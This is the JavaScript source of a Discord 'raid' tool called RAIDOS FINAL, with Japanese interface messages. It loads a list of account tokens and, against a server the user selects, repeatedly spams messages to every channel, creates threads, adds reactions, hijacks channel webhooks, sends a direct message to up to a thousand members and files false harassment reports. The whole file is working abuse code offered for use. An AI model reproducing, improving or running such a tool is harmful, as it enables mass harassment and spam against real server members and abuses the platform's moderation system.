const log = (m) => {
  const t = new Date().toLocaleTimeString('ja-JP',{hour12:false});
  document.getElementById('log').innerHTML += `[\( {t}] \){m}<br>`;
  document.getElementById('log').scrollTop = 999999;
};

let tokens = [], target = null, running = false, msg = "@everyone";
const f = {};

document.querySelectorAll('[data-f]').forEach(c=> f[c.dataset.f] = c.checked ? true : false);
document.getElementById('msg').oninput = e => msg = e.target.value || "@everyone";

document.getElementById('tokens').oninput = async () => {
  tokens = document.getElementById('tokens').value.trim().split('\n').filter(Boolean);
  document.getElementById('tcount').textContent = tokens.length+"個";
  if(tokens.length) loadGuilds();
};

async function loadGuilds() {
  const list = document.getElementById('guilds');
  list.innerHTML = "";
  const set = new Set();
  for(const t of tokens){
    try{
      const r = await fetch('https://discord.com/api/v10/users/@me/guilds',{headers:{Authorization:t}});
      if(r.ok){
        const gs = await r.json();
        gs.forEach(g=>{
          if(!set.has(g.id)){
            set.add(g.id);
            const d = document.createElement('div');
            d.className = 'item';
            d.textContent = g.name;
            d.onclick = ()=>{
              document.querySelectorAll('.item').forEach(x=>x.classList.remove('active'));
              d.classList.add('active');
              target = g.id;
              document.getElementById('tname').textContent = g.name;
              log(`ターゲット → ${g.name}`);
            };
            list.appendChild(d);
          }
        });
      }
    }catch(e){}
  }
}

async function loop(){
  if(!running || !target) return;
  const token = tokens[Math.floor(Math.random()*tokens.length)];

  try{
    const chs = await fetch(`https://discord.com/api/v10/guilds/${target}/channels`,{headers:{Authorization:token}}).then(r=>r.json());

    for(const ch of chs){
      if(!running) break;

      // RAIDER
      if(f.raider && ch.type===0){
        await fetch(`https://discord.com/api/v10/channels/${ch.id}/messages`,{method:'POST',headers:{Authorization:token,'Content-Type':'application/json'},body:JSON.stringify({content:msg})});
      }

      // THREAD-SPAMMER
      if(f.thread && ch.type===0){
        fetch(`https://discord.com/api/v10/channels/${ch.id}/threads`,{method:'POST',headers:{Authorization:token,'Content-Type':'application/json'},body:JSON.stringify({name:"raid",type:11})});
      }

      // REACTION-SPAMMER
      if(f.react && ch.last_message_id){
        ["U+1F525","U+1F4A5","U+1F921"].forEach(e=>fetch(`https://discord.com/api/v10/channels/\( {ch.id}/messages/ \){ch.last_message_id}/reactions/${e}/@me`,{method:'PUT',headers:{Authorization:token}}));
      }

      // WEBHOOK-SPAMMER (チャンネルからWebhook取得→スパム)
      if(f.webhook){
        const hooks = await fetch(`https://discord.com/api/v10/channels/${ch.id}/webhooks`,{headers:{Authorization:token}}).then(r=>r.json()).catch(()=>[]);
        hooks.forEach(h=>fetch(h.url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:msg})}));
      }
    }

    // DM-SPAMMER (サーバーメンバー取得→DM)
    if(f.dm){
      const mem = await fetch(`https://discord.com/api/v10/guilds/${target}/members?limit=1000`,{headers:{Authorization:token}}).then(r=>r.json());
      mem.forEach(m=>fetch('https://discord.com/api/v10/users/@me/channels',{method:'POST',headers:{Authorization:token,'Content-Type':'application/json'},body:JSON.stringify({recipient_id:m.user.id})}).then(r=>r.json()).then(c=>fetch(`https://discord.com/api/v10/channels/${c.id}/messages`,{method:'POST',headers:{Authorization:token,'Content-Type':'application/json'},body:JSON.stringify({content:msg})})));
    }

    // REPORT-SPAMMER (メッセージがあれば通報)
    if(f.report && chs[0]?.last_message_id){
      fetch(`https://discord.com/api/v10/report`,{method:'POST',headers:{Authorization:token,'Content-Type':'application/json'},body:JSON.stringify({channel_id:chs[0].id,message_id:chs[0].last_message_id,reason:"harassment"})});
    }

  }catch(e){}

  setTimeout(loop, f.allch ? 50 : 800);
}

document.getElementById('start').onclick = () => {
  if(!target) return alert("サーバーを選択");
  running = true;
  log("攻撃開始");
  loop();
};

document.getElementById('stop').onclick = () => {
  running = false;
  log("攻撃停止");
};

log("RAIDOS FINAL 起動完了");
